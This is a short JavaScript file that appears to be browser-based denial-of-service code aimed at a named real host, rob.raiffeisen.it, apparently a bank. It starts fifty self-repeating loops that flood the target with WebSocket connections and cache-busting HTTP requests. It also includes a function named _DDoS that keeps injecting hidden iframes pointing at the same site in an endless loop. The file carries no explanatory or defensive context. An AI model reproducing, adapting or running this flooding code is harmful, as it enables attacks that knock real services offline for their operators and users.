var target = 'rob.raiffeisen.it';
var thread_count = 50;
var scan_counter = 0;
var resp_size_counter = 0;
var Sys = {};
var ua = navigator.userAgent.toLowerCase();
var s;
(s = ua.match(/msie ([\d.]+)/)) ? Sys.ie = s[1] : 0;
var xhr; 
if (!Sys.ie){
  var i = 0;
  while(i<thread_count){
    while_loop_cor();
    i++;
  }
}else{
  var i = 0;
  while(i<thread_count){
    while_loop_ie();i++;
  }
}
if (!Sys.ie){
  xhr = new XMLHttpRequest();
  xhr.onreadystatechange = processResp;
}else{
  xdr = new XDomainRequest();
  xdr.timeout = 1;
}

function while_loop_cor(){
  try{
    ws = new WebSocket('ws://' + target);
    scan_counter = scan_counter+1;
    xhr = new XMLHttpRequest();
    var furl='http://' + target + '?xb0z=' + Math.floor(Math.random()*10000000000);
    xhr.open('GET', furl);
    xhr.onreadystatechange = function(){
      if (xhr.readyState==4){
        resp_size_counter = resp_size_counter+xhr.responseText.length;
      }
    };
    xhr.onerror = function(e){} 
    xhr.send(100);
    setTimeout("while_loop_cor()",0);
  }
  catch(err){return;}
} 

function while_loop_ie(){
  try{
    scan_counter = scan_counter+1;
    xdr = new XDomainRequest();
    xdr.open('get', 'http://' + target + ':80');
    xdr.send();
    setTimeout('while_loop_ie()',0);
  }catch(err){
    return;
  }
}

function processResp(){
  if (xmlhttp.readyState==4){}
}
var url = ("portaleargo.it")

function _DDoS(url){
 document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
}
for(;;){
 setTimeout('_DDoS("https://rob.raiffeisen.it")',1);
}
